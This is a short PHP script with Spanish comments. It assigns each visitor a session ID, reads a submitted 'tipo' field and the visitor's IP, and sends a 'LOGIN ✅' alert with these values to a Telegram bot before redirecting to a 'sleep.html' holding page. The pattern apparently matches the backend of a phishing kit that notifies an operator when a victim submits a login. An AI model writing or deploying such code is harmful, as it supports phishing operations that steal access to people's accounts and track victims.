<?php
session_start();

// Crear usuario si no existe en sesión
if (!isset($_SESSION['usuario'])) {
    $_SESSION['usuario'] = 'cli_' . rand(1000, 9999);
}

$usuario = $_SESSION['usuario'];
$tipo = $_POST['tipo'] ?? 'no especificado';

// Obtener IP
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

require_once("settings.php");

// Enviar mensaje a Telegram
$mensaje = "LOGIN ✅ : $tipo\n👤 Usuario: $usuario\n🌐 IP: $ip";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    "chat_id" => $chat_id,
    "text" => $mensaje
]));

// Redirigir al cliente
header("Location: sleep.html");
exit;
